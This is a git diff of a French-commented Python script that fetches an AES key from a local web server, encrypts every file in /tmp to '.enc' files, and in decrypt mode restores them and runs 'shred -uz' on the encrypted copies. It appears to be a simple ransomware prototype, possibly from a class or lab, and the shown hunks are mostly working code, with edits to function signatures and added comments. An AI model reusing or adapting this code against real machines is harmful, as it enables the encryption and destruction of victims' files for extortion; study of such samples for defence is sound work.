@@ -7,22 +7,25 @@ import requests
 import sys
 import subprocess
 
-def encryptFile(key, filename, out_filename=None, chunksize=64*1024):
+def encryptFile(key, filename, chunksize=24*1024):
     '''
     Chiffre un fichier en utilisant l'algorithme AES-256
     key : clé utilisé pour le chiffrement de taille 32 bits
     filename : le fichier qu'on souhaite chiffrer
-    out_filename : le fichier chiffré
-    chunksize : taille de bloc que la fonction va lire, ici on prend des morceaux de 64 octets,
+    chunksize : taille de bloc que la fonction va lire, ici on prend des morceaux de 24 octets,
     		ce système permet de chiffrer des fichiers volumineux sans saturer la RAM. 
     '''
-
-    if not out_filename:
-        out_filename = filename + '.enc'
-
+    
+    #On créer le fichier de sortie chiffré
+    out_filename = filename + '.enc'
+    
+    #On génère un vecteur d'initialisation de 16 octets
     iv = Random.new().read(AES.block_size)
 
+    #On setup la fonction de chiffement avec la clé, le mode et le vecteur d'initialisation
     encryptor = AES.new(key, AES.MODE_CBC, iv)
+
+    #On récupère la taille du fichier orignale
     filesize = os.path.getsize(filename)
 
     with open(filename, 'rb') as infile:
@@ -41,17 +44,14 @@ def encryptFile(key, filename, out_filename=None, chunksize=64*1024):
     
     
 
-def decryptFile(key, filename, out_filename=None, chunksize=24*1024):
+def decryptFile(key, filename, chunksize=24*1024):
     '''
     Déchiffre un fichier
     key : clé utilisé pour déchiffrer
     filename : le fichier qu'on souhaite déchiffrer
-    out_filename : le fichier déchiffré
     chunksize : taille de bloc que la fonction va lire, ici 24 octets
     '''
-
-    if not out_filename:
-        out_filename = filename[:-4]
+    out_filename = filename[:-4]
 
     with open(filename, 'rb') as infile:
         origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
@@ -70,14 +70,14 @@ def decryptFile(key, filename, out_filename=None, chunksize=24*1024):
 
 def main(argv):
 
-    #faire une requête get au serveur web pour récupérer la clé et l'iv
+    #faire une requête get au serveur web pour récupérer la clé
     url = 'http://localhost:8888/key.txt'
     resp = requests.get(url)
     key=resp.text
     key=key.rstrip("\n")
     key= key.encode('utf-8')
 
-    # a changer en /tmp
+    # Le dossier à chiffrer
     directory = '/tmp'
 
     is_decrypt = None
@@ -98,7 +98,7 @@ def main(argv):
                 if file[-4:] == ".enc":
                     #print("[*] Decrypting... ")
                     decryptFile(key, file)
-	                #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
+	             #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
                     subprocess.check_output(["shred", "-uz", file])
 
             # chiffrement
